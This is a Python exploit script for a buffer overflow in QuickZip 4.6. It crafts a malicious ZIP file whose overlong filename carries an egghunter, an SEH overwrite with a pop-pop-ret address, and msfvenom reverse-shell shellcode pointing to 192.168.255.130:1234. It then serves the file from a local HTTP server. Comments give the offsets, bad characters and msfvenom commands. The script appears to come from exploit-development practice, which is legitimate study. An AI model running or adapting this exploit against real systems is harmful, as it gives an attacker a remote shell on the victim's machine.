#!/usr/bin/python3
# QuickZip 4.6 buffer overflow exploit
# Unlike Ken Ward, the Filename Length field of the zip format is required or it won't work, it's marked in comments below

import struct
import socketserver
import subprocess
import http.server


def create_file(offset):
    # NSEH is at 295
    # SEH is at 299
    # bad chars: \x00\x2f\x3a\x5c
    # buf found even though null byte in pop pop ret cuts off string, buf is unmangled after the null byte
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.255.130 LPORT=1234 -f python -b "\x00\x2f\x3a\x5c" EXITFUNC=seh
    buf = b"w00tw00t"
    buf += b"\xba\x50\xce\x9b\x42\xda\xc6\xd9\x74\x24\xf4\x5b\x33"
    buf += b"\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\x93\xca\x79"
    buf += b"\xb7\xef\x3b\xff\x38\x0f\xbc\x60\xb0\xea\x8d\xa0\xa6"
    buf += b"\x7f\xbd\x10\xac\x2d\x32\xda\xe0\xc5\xc1\xae\x2c\xea"
    buf += b"\x62\x04\x0b\xc5\x73\x35\x6f\x44\xf0\x44\xbc\xa6\xc9"
    buf += b"\x86\xb1\xa7\x0e\xfa\x38\xf5\xc7\x70\xee\xe9\x6c\xcc"
    buf += b"\x33\x82\x3f\xc0\x33\x77\xf7\xe3\x12\x26\x83\xbd\xb4"
    buf += b"\xc9\x40\xb6\xfc\xd1\x85\xf3\xb7\x6a\x7d\x8f\x49\xba"
    buf += b"\x4f\x70\xe5\x83\x7f\x83\xf7\xc4\xb8\x7c\x82\x3c\xbb"
    buf += b"\x01\x95\xfb\xc1\xdd\x10\x1f\x61\x95\x83\xfb\x93\x7a"
    buf += b"\x55\x88\x98\x37\x11\xd6\xbc\xc6\xf6\x6d\xb8\x43\xf9"
    buf += b"\xa1\x48\x17\xde\x65\x10\xc3\x7f\x3c\xfc\xa2\x80\x5e"
    buf += b"\x5f\x1a\x25\x15\x72\x4f\x54\x74\x1b\xbc\x55\x86\xdb"
    buf += b"\xaa\xee\xf5\xe9\x75\x45\x91\x41\xfd\x43\x66\xa5\xd4"
    buf += b"\x34\xf8\x58\xd7\x44\xd1\x9e\x83\x14\x49\x36\xac\xfe"
    buf += b"\x89\xb7\x79\x50\xd9\x17\xd2\x11\x89\xd7\x82\xf9\xc3"
    buf += b"\xd7\xfd\x1a\xec\x3d\x96\xb1\x17\xd6\x59\xed\xe8\xa4"
    buf += b"\x32\xec\x16\xad\x10\x79\xf0\xc7\x84\x2c\xab\x7f\x3c"
    buf += b"\x75\x27\xe1\xc1\xa3\x42\x21\x49\x40\xb3\xec\xba\x2d"
    buf += b"\xa7\x99\x4a\x78\x95\x0c\x54\x56\xb1\xd3\xc7\x3d\x41"
    buf += b"\x9d\xfb\xe9\x16\xca\xca\xe3\xf2\xe6\x75\x5a\xe0\xfa"
    buf += b"\xe0\xa5\xa0\x20\xd1\x28\x29\xa4\x6d\x0f\x39\x70\x6d"
    buf += b"\x0b\x6d\x2c\x38\xc5\xdb\x8a\x92\xa7\xb5\x44\x48\x6e"
    buf += b"\x51\x10\xa2\xb1\x27\x1d\xef\x47\xc7\xac\x46\x1e\xf8"
    buf += b"\x01\x0f\x96\x81\x7f\xaf\x59\x58\xc4\xd1\xa8\x50\xd1"
    buf += b"\x46\x13\x01\x98\x0a\xa4\xfc\xdf\x32\x27\xf4\x9f\xc0"
    buf += b"\x37\x7d\xa5\x8d\xff\x6e\xd7\x9e\x95\x90\x44\x9e\xbf"
    # echo -ne "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa
    # \xaf\x75\xea\xaf\x75\xe7\xff\xe7" | msfvenom -a x86 --platform Windows -b "\x00\x2f\x3a\x5c" -f python -e 
    # x86/alpha_mixed BufferRegister=EAX -v egghunter
    egghunter =  b"\x41\x41\x41"
    egghunter += b"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
    egghunter += b"\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
    egghunter += b"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
    egghunter += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
    egghunter += b"\x42\x75\x4a\x49\x73\x56\x6e\x61\x78\x4a\x79\x6f"
    egghunter += b"\x66\x6f\x71\x52\x50\x52\x31\x7a\x37\x72\x51\x48"
    egghunter += b"\x58\x4d\x64\x6e\x75\x6c\x57\x75\x33\x6a\x51\x64"
    egghunter += b"\x58\x6f\x4c\x78\x63\x47\x46\x50\x56\x50\x72\x54"
    egghunter += b"\x4e\x6b\x39\x6a\x6c\x6f\x30\x75\x68\x6a\x4e\x4f"
    egghunter += b"\x32\x55\x69\x77\x49\x6f\x5a\x47\x41\x41" 
    max_length = 4064
    # pop pop ret found in QuickZip.exe
    seh = struct.pack("<I", 0x00435133)
    # pushes ESP onto the stack, pops it into EAX, adjusts EAX to the beginning of the buffer, jumps to EAX
    # translated using zip_char_translator.py
    jmpcode = b"\x54\x58\x2d\x7f\x7f\x7f\x7f\x2d\x60\x70\x7f\x7f\x2d\x09\x0b\x01\x01\x98\x85"
    # NSEH jumps backwards 28 bytes in order to hit the jmpcode variable code
    # translated using zip_char_translator.py
    nseh = b"\x41\x77\x84\x41"
    filename = egghunter + b"A"* (offset - len(jmpcode) - len(egghunter)) +jmpcode + nseh + seh + buf + b"D"*(max_length - offset - 8 - len(buf))
    filename = filename.strip() + b".txt"
    local_file_header = b"\x50\x4b\x03\x04" # Local File signature
    local_file_header += b"\x14\x00" # minimum version needed to extract
    local_file_header += b"\x00\x00" # General purpose bit flag
    local_file_header += b"\x00\x00" # Compression method
    local_file_header += b"\x00\x00" # File last modification time
    local_file_header += b"\x00\x00" # File last modification date
    local_file_header += b"\x00\x00\x00" # CRC-32
    local_file_header += b"\x00\x00\x00\x00" # Compressed size
    local_file_header += b"\x00\x00\x00\x00" # Uncompressed size
    local_file_header += b"\x00\x00" # File name length
    local_file_header += b"\x00\x00\x00" # Extra field length
    local_file_header += filename # File name
    local_file_header += b"" # Extra field

    data = ""
    # data_descriptor is only used when the CRC isn't known when the file is generated
    data_descriptor = b"\x50\x4b\x07\x08" # Optional data descriptor signature
    data_descriptor += b"\x00\x00\x00\x00" # CRC-32
    data_descriptor += b"\x00\x00\x00\x00" # Compressed size
    data_descriptor += b"\x00\x00\x00\x00" # Uncompressed size
    
    central_file_directory_header = b"\x50\x4b\x01\x02" # Central directory file header signature
    central_file_directory_header += b"\x14\x00" # version made by
    central_file_directory_header += b"\x14\x00" # minimum version needed to extract
    central_file_directory_header += b"\x00\x00" # general purpose bit flag
    central_file_directory_header += b"\x00\x00" # Compression method
    central_file_directory_header += b"\x00\x00" # File last modification time
    central_file_directory_header += b"\xce\x00" # File last modification date
    central_file_directory_header += b"\x00\x00\x00\x00" # CRC-32
    central_file_directory_header += b"\x00\x00\x00\x00" # Compressed size
    central_file_directory_header += b"\x00\x00\x00\x00" # Uncompressed size
    central_file_directory_header += b"\x00\x0f" # File name length ** REQUIRED FIELD
    central_file_directory_header += b"\x00\x00" # Extra field length
    central_file_directory_header += b"\x00\x00" # File comment length
    central_file_directory_header += b"\x00\x00" # Disk number where file starts
    central_file_directory_header += b"\x00\x00" # Internal file attributes
    central_file_directory_header += b"\x00\x00\x00\x00" # External file attributes
    central_file_directory_header += b"\x00\x00\x00\x00" # Relative offset of local file header
    central_file_directory_header += filename # File name
    central_file_directory_header += b"" # Extra field
    central_file_directory_header += b"" # File comment
    
    # eocd = end of central directory record
    eocd = b"\x50\x4b\x05\x06" # eocd signature
    eocd += b"\x00\x00" # number of this disk
    eocd += b"\x00\x00" # disk where central directory starts
    eocd += b"\x01\x00" # Number of central directory records on this disk
    eocd += b"\x01\x00" # total number of central directory records
    eocd += b"\x12\x10\x00\x00" # Size of central directory
    eocd += b"\x02\x10\x00\x00" # Offset of start of central directory relative to start of archive
    eocd += b"\x00\x00" # Comment length
    eocd += b"" # Comment

    attack = local_file_header + central_file_directory_header + eocd

    file = open("test1.zip", "wb")
    file.write(attack)
    file.close()

def serve_directory():
    port = 8000 
    ip = "192.168.255.130"
    httpServer = socketserver.TCPServer((ip, port), http.server.SimpleHTTPRequestHandler)
    print("[+] Starting HTTP Server on " + ip + " port " + str(port))
    httpServer.serve_forever()

def main():
    offset = 295
    create_file(offset)
    serve_directory()

if __name__ == "__main__":
    main()
